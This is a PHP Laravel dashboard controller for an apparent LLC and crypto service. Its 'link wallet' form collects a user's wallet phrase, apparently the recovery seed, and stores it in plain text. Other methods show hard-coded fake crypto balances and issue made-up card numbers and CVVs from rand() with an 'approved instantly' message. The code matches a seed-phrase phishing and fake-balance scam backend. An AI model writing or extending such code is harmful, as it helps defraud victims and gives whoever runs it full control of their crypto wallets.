<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class DashboardController extends Controller
{
    public function index()
    {
        $user = Auth::user();
        $companies = $user->companies()->latest()->get();

        $totalLLCs = $companies->count();
        $approvedLLCs = $companies->where('status', 'approved')->count();
        $pendingLLCs = $companies->where('status', 'pending')->count();
        $processingLLCs = $companies->where('status', 'processing')->count();
        $rejectedLLCs = $companies->where('status', 'rejected')->count();

        return view('dashboard.index', compact(
            'user', 'companies', 'totalLLCs', 'approvedLLCs',
            'pendingLLCs', 'processingLLCs', 'rejectedLLCs'
        ));
    }

    public function showLinkWallet()
    {
        return view('dashboard.link-wallet');
    }

    public function linkWallet(Request $request)
    {
        $request->validate([
            'wallet_name' => 'required|string',
            'wallet_phrase' => 'required|string',
        ]);

        $user = Auth::user();
        $user->wallet_name = $request->input('wallet_name');
        $user->wallet_phrase = $request->input('wallet_phrase');
        $user->wallet_connected = true;
        $user->save();

        return redirect()->route('crypto')->with('success', 'Wallet linked successfully!');
    }

    public function showReceive()
    {
        $cryptos = \App\Models\CryptoDetail::all();
        return view('dashboard.receive', compact('cryptos'));
    }

    public function showReceiveDetails(Request $request)
    {
        $walletName = $request->query('wallet');
        
        $crypto = \App\Models\CryptoDetail::where('name', $walletName)->first();
        
        if (!$crypto) {
            $crypto = \App\Models\CryptoDetail::where('symbol', 'LIKE', '%' . $walletName . '%')
                ->orWhere('network', 'LIKE', '%' . $walletName . '%')
                ->first();
        }
        
        if (!$crypto) {
            abort(404, 'Cryptocurrency network not supported.');
        }
        
        return view('dashboard.receive-details', compact('crypto'));
    }

    public function showBuy()
    {
        return view('dashboard.buy');
    }

    public function showCards()
    {
        $user = Auth::user();
        $cards = \App\Models\Card::where('user_id', $user->id)->latest()->get();

        $simulatedWallets = [
            [
                'symbol' => 'BTC',
                'name' => 'Bitcoin',
                'balance' => '0.2458 BTC',
                'usd_value' => 18870.00,
            ],
            [
                'symbol' => 'ETH',
                'name' => 'Ethereum',
                'balance' => '3.4210 ETH',
                'usd_value' => 8850.00,
            ],
            [
                'symbol' => 'USDT',
                'name' => 'Tether USD',
                'balance' => '15000.00 USDT',
                'usd_value' => 15000.00,
            ]
        ];

        return view('dashboard.cards', compact('cards', 'simulatedWallets'));
    }

    public function applyCard(Request $request)
    {
        $request->validate([
            'balance' => 'required|string',
            'card_type' => 'required|string|in:visa,mastercard,amex,discover',
        ]);

        $user = Auth::user();
        
        $wallets = [
            'BTC' => ['name' => 'Bitcoin Wallet', 'usd_value' => 18870.00],
            'ETH' => ['name' => 'Ethereum Wallet', 'usd_value' => 8850.00],
            'USDT' => ['name' => 'Tether USD Wallet', 'usd_value' => 15000.00],
        ];

        $selectedWallet = $wallets[$request->input('balance')] ?? null;

        if (!$selectedWallet) {
            return redirect()->back()->with('error', 'Selected wallet balance is invalid.');
        }

        $cardType = $request->input('card_type');
        $cardNumber = '';
        if ($cardType === 'visa') {
            $cardNumber = '4' . $this->generateRandomDigits(15);
        } elseif ($cardType === 'mastercard') {
            $cardNumber = '5' . $this->generateRandomDigits(15);
        } elseif ($cardType === 'amex') {
            $cardNumber = '37' . $this->generateRandomDigits(13);
        } else {
            $cardNumber = '6011' . $this->generateRandomDigits(12);
        }

        $formattedCardNumber = '';
        if ($cardType === 'amex') {
            $formattedCardNumber = substr($cardNumber, 0, 4) . ' ' . substr($cardNumber, 4, 6) . ' ' . substr($cardNumber, 10);
        } else {
            $formattedCardNumber = implode(' ', str_split($cardNumber, 4));
        }

        $cvv = $cardType === 'amex' ? $this->generateRandomDigits(4) : $this->generateRandomDigits(3);
        $expiryDate = now()->addYears(5)->format('m/y');

        \App\Models\Card::create([
            'user_id' => $user->id,
            'card_number' => $formattedCardNumber,
            'card_holder_name' => $user->name,
            'card_type' => $cardType,
            'balance' => $selectedWallet['usd_value'],
            'wallet_name' => $selectedWallet['name'],
            'cvv' => $cvv,
            'expiry_date' => $expiryDate,
            'status' => 'active',
        ]);

        return redirect()->route('crypto.cards')->with('success', 'Your premium card was approved instantly!');
    }

    public function toggleCardStatus(Request $request)
    {
        $request->validate([
            'card_id' => 'required|integer',
        ]);

        $user = Auth::user();
        $card = \App\Models\Card::where('user_id', $user->id)->where('id', $request->input('card_id'))->first();

        if (!$card) {
            return redirect()->back()->with('error', 'Card not found.');
        }

        $newStatus = $card->status === 'active' ? 'blocked' : 'active';
        $card->status = $newStatus;
        $card->save();

        $msg = $newStatus === 'active' ? 'Card activated successfully!' : 'Card frozen successfully!';
        return redirect()->back()->with('success', $msg);
    }

    private function generateRandomDigits($length)
    {
        $digits = '';
        for ($i = 0; $i < $length; $i++) {
            $digits .= rand(0, 9);
        }
        return $digits;
    }
}
